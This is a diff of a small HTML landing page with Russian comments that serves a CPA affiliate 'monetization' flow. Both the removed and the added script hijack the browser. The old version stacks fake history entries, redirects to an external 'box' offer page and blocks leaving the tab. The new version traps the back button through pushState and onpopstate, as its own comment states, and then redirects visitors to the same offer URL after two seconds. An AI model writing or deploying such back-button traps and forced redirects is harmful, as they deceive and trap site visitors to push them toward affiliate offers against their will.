@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Домен Monetization</title>
+    <title>Hello World</title>
     <style>
         body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #222; color: #fff; text-align: center; }
         h1 { font-size: 40px; color: #ffcc00; }
@@ -12,30 +12,23 @@
 <body>
     <div>
         <h1>Hello World</h1>
-        <p>Подождите, мы готовим для вас предложение...</p>
+        <p>Загрузка предложения...</p>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const geo = urlParams.get('geo') || 'unknown';
 
-        // 1. Создаем три виртуальные страницы в истории браузера
-        history.pushState({page: 1}, null, location.href);
-        history.pushState({page: 2}, null, location.href);
-        history.pushState({page: 3}, null, location.href);
-
-        // 2. Перекидываем на бокс
-        window.location.href = 'https://azosteam.github.io/cpa-land/box.html?geo=' + geo;
-
-        // 3. Ловушка (если попытаются вернуться назад, не выпустит)
+        // Записываем в историю, чтобы кнопка "Назад" не выкинула из сайта
+        history.pushState(null, null, location.href);
         window.onpopstate = function () {
-            history.pushState({page: 1}, null, location.href);
+            history.pushState(null, null, location.href);
         };
 
-        // 4. Ловушка закрытия вкладки
-        window.onbeforeunload = function() {
-            return "Вы уверены, что хотите уйти?";
-        };
+        // Через 2 секунды перекидываем на Бокс
+        setTimeout(() => {
+            window.location.href = 'https://azosteam.github.io/cpa-land/box.html?geo=' + geo;
+        }, 2000);
     </script>
 </body>
 </html>
